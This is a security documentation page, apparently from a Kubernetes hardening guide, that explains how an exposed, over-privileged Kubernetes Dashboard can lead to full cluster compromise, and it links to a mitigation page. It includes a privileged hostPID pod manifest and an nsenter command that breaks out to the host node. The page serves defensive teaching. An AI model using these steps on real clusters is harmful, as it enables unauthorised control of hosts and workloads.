---
sidebar_position: 3
title: "Exposed Kubernetes Dashboard"
description: "How an exposed and over-privileged Kubernetes Dashboard can become an entry point for full cluster compromise."
keywords: [kubernetes security, kubernetes dashboard, dashboard security, exposed dashboard, kubernetes UI, dashboard vulnerability, cluster compromise, authentication bypass, dashboard access, web interface security]
---

# Exposed Kubernetes Dashboard

The Kubernetes Dashboard is a web-based interface for managing cluster resources and workloads. While helpful for development and debugging, an exposed and misconfigured Dashboard can allow attackers to gain administrative control over the entire cluster.

This article explores how multiple misconfigurations can align to turn the Dashboard into a critical attack vector.

---

## Exploitation Steps: Full Cluster Compromise via Dashboard

### 1. Discover the Exposed Dashboard

The attacker scans for publicly accessible services and identifies the Kubernetes Dashboard exposed over HTTP or via a misconfigured Ingress or LoadBalancer:

```
http://<public-ip>:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
```

If no authentication is required, the attacker gains direct access to the Dashboard UI.

### 2. Enumerate Available Capabilities

Within the Dashboard, the attacker checks whether they can:

- View secrets, namespaces, pods, and deployments
- Create new pods or services
- Execute commands in running containers

If the Dashboard is bound to a service account with `cluster-admin` privileges, all of these actions will be permitted.

### 3. Deploy a Privileged Pod

The attacker uses the Dashboard UI to create a pod with elevated access:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  containers:
    - name: shell
      image: alpine
      command: ["/bin/sh"]
      args: ["-c", "sleep infinity"]
      securityContext:
        privileged: true
  hostPID: true
  restartPolicy: Never
```

This pod runs in privileged mode with access to the host’s process namespace.

### 4. Escape the Container and Access the Host

Using the Dashboard’s Exec feature, the attacker enters the container and runs:

```bash
nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
```

If successful, the attacker bypasses the container boundary and gains a shell on the underlying host node.

---

### Result

An attacker can:

- Interact directly with all Kubernetes resources using the Dashboard
- Deploy privileged containers to bypass isolation
- Escalate privileges to the host
- Exfiltrate data or disrupt workloads
- Fully compromise the cluster

This attack relies on a combination of insecure defaults, missing access controls, and excessive service account privileges.

---

## Mitigation

➡ [Exposed Dashboard Mitigation](/docs/best_practices/cluster_setup_and_hardening/network_security/exposed_dashboard_mitigation)
